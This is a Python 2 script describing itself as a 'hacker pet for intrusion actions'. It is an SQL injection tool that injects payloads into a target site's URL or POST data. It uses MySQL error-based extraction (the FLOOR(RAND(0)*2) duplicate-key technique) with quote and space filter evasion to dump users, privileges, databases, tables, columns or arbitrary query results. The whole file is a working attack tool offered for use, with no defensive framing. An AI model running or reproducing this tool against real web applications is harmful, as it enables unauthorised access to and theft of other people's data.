#!/usr/bin/env python2
import re, time, urllib, urllib2
import argparse

p = argparse.ArgumentParser( description = 'Hacker pet for intrusion actions...' )
p.add_argument( '-u' , '--url'     , required = True          , help = 'url of site (can contain >>value<<)' )
p.add_argument( '-p' , '--post'    , metavar = 'POST'         , help = 'to send POST data use this var'  )
p.add_argument( '-c' , '--cookie'  , metavar = 'COOKIE'       , help = 'cookie to send with POST or GET' )
p.add_argument( '-a' , '--avoid'   , default = ''             , help = 'string of characters wich should be avoided in sql queries' )
p.add_argument( '-v' , '--verbose' , action = 'append_const'  , const = 1, default = []  , help = 'how much verbose should be output' )
p.add_argument( '-E' , '--engine'  , default = 'mysql', choices = ['mysql', 'postgres']  , help = 'engine of database'  )
p.add_argument( '-D' , metavar = 'DATABASE' , help = 'database to use' )
p.add_argument( '-T' , metavar = 'TABLE'    , help = 'table to use'    )
p.add_argument( '-U' , metavar = 'TABLE'    , help = 'username to use' )

g = p.add_mutually_exclusive_group( required=True )
g.add_argument( '-g' , '--get', choices = [ 'user', 'privs', 'dbs', 'tbls', 'cols' ], help = 'wich object to retrieve from database' )
g.add_argument( '--sql', metavar = 'SQL_QUERY', help = 'this query will be retrieved from database' )

sp = p.add_subparsers( help = 'Commands for piglet:' )
pp = sp.add_parser( 'error', help = 'error-based SQL dumper' )
pp.set_defaults( func = lambda : DError( args ).run() )

pp = sp.add_parser( 'blind', help = 'blind-based SQL dumper' )
pp.set_defaults( func = lambda : DError( args ).run() )

pp = sp.add_parser( 'union', help = 'union-based SQL dumper' )
pp.set_defaults( func = lambda : DError( args ).run() )

args = p.parse_args()

class API( object ):
    def __init__( self, args ):
        self.a = args

    def log( self, lvl, msg ):
        if lvl <= len( self.a.verbose ):
            print msg

    def err( self, msg ):
        print msg
        exit( 1 )

    def raw_html( self, get = None, post = None, cookie = None ):
        tsleep = 0.05
        for n_try in xrange( 5 ):   ## try five times to get url
            time.sleep( tsleep )
            self.log( 2, "request %s:\n\tGET: %s\n\tPOST: %s\n\tCOOKIE:%s" % ( n_try, get, post, cookie ) )

            o = urllib2.build_opener( )
            r = urllib2.Request( get, post )
            if cookie:
                pass

            code, html = None, ""
            try:
                stream = o.open( r, timeout = 15 )
                code = stream.getcode()
                html = stream.read()
            except urllib2.HTTPError, e:
                code = e.getcode()
                html = e.read()
            except urllib2.URLError, e:
                code = None
                tsleep   *= 2   ## double time to sleep
                self.log( 0, '[[[ time out -- tsleep = %s ]]]' % tsleep )

            if code is not None:
                break               ## go out from for loop...

        return ( code, html )


    def codes( self, val = r'\1' ):
        """ return:
            code             : code for url ( 200, 404, 401 ... )
            lcnt, wcnt, ccnt : line, word and char counts for page
        """
        ccnt, wcnt, lcnt = None, None, None
        c, h = self.html( val )
        if c:
            ccnt = len( h )
            wcnt = len( h.split() )
            lcnt = len( h.split('\n') )

        return c, lcnt, wcnt, ccnt
        
    def html( self, val = r'\1' ):
        r = re.compile( r'>>(.*)<<' )
        vs = [ self.a.url, self.a.post, self.a.cookie ]
        vs = map( lambda x: x and r.sub( val, x ), vs )
        return self.raw_html( get = vs[ 0 ], post = vs[ 1 ], cookie = vs[ 2 ] )

    def dval( self ):
        r = re.compile( r'>>(.*)<<' )
        vs = [ self.a.url, self.a.post, self.a.cookie ]
        vs = map( lambda x: x and r.search( x ), vs )
        vs = filter( lambda x: x, vs )
        return vs[ 0 ].group( 1 )
        
    def pval( self, val ):
        r = re.compile( r'>>(.*)<<' )
        vs = [ self.a.url, self.a.post, self.a.cookie ]
        vs = map( lambda x: x and r.sub( val, x ), vs )
        print "GET: %s\n\tPOST: %s\n\tCOOKIE:%s" % ( vs[ 0 ], vs[ 1 ], vs[ 2 ] )


class SQL( object ):
    arr = { 'mysql': {}, 'postgres': {} }
    arr[ 'mysql' ][ 'user'      ] = "SELECT USER()"
    arr[ 'mysql' ][ 'dbs'       ] = "SELECT schema_name FROM information_schema.schemata LIMIT %(i)s,1"
    arr[ 'mysql' ][ 'dbs_cnt'   ] = "SELECT count(schema_name) FROM information_schema.schemata"
    arr[ 'mysql' ][ 'tbls'      ] = "SELECT table_name FROM information_schema.tables WHERE table_schema='%(db)s' LIMIT %(i)s,1"
    arr[ 'mysql' ][ 'tbls_cnt'  ] = "SELECT count(table_name) FROM information_schema.tables WHERE table_schema='%(db)s'"
    arr[ 'mysql' ][ 'cols'      ] = "SELECT column_name FROM information_schema.columns WHERE table_schema='%(db)s' AND table_name='%(tbl)s' LIMIT %(i)s,1"
    arr[ 'mysql' ][ 'cols_cnt'  ] = "SELECT count(column_name) FROM information_schema.columns WHERE table_schema='%(db)s' AND table_name='%(tbl)s'"
    arr[ 'mysql' ][ 'privs'     ] = "SELECT privilege_type FROM information_schema.user_privileges WHERE grantee like '%(user)s' LIMIT %(i)s,1";
    arr[ 'mysql' ][ 'privs_cnt' ] = "SELECT count(privilege_type) FROM information_schema.user_privileges WHERE grantee like '%(user)s'";

    def __init__( self, args, eng ):
        self.a   = args
        self.eng = eng

    def my_hex( self, s ):
        l = map( lambda c: hex( ord( c ) )[ 2: ], s )
        return '0x' + ''.join( l )

    def prepare( self, s ):
        for c in self.a.avoid:
            if c == "'":
                r = re.compile( r"'((?:[^'\\]|\\.)*)'" )
                s = r.sub( lambda m: self.my_hex( m.group( 1 ) ), s )
            elif c == '`':
                s = s.replace( '`', '' )
            elif c == ' ':
                s = s.replace( ' ', '/**/' )

        return '(%s)' % s

    def __call__( self, name, i = 0 ):
        db, tbl, user = self.a.D, self.a.T, self.a.U
        if name in self.arr[ self.eng ]:
            s = self.arr[ self.eng ][ name ]
            return self.prepare( s % dict( db = db, tbl = tbl, user = user, i = i ) )
        else:
            return None


class DError( API ):
    """ error-based dumper
    """
    def get( self, sss ):
        if self.a.engine == 'mysql':
            sss = '''(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)x GROUP BY MID((%s), FLOOR(RAND(0)*2), 64))''' % sss
            sss = sql.prepare( sss )
            sss = urllib.quote( sss ) ## TODO: move this to filter functionality
            c, h = self.html( sss )
            open( '/tmp/debug.htm', 'w' ).write( h )
            m = re.search( r"Duplicate entry '([^']*)' for key", h )
            return m and m.group( 1 )
        else:
            self.err( 'can''t use this method on "%s" engine' % self.a.engine )

    def run( self ):
        g = self.a.get
        s = self.a.sql
        if g:
            sql_cnt = sql( g + '_cnt' )
            if sql_cnt is None:
                self.log( 0, 'result: ' + self.get( sql( g ) ) )
            else:
                cnt = int( self.get( sql_cnt ) )
                self.log( 0, 'count for %s is %s' % ( g, cnt ) )
                for i in xrange( cnt ):
                    self.log( 0, 'result[%s]: %s' % ( i, self.get(sql(g,i)) ) )
        elif s:
            self.log( 0, 'result: ' + self.get( s ) )

sql = SQL( args, args.engine )
args.func()
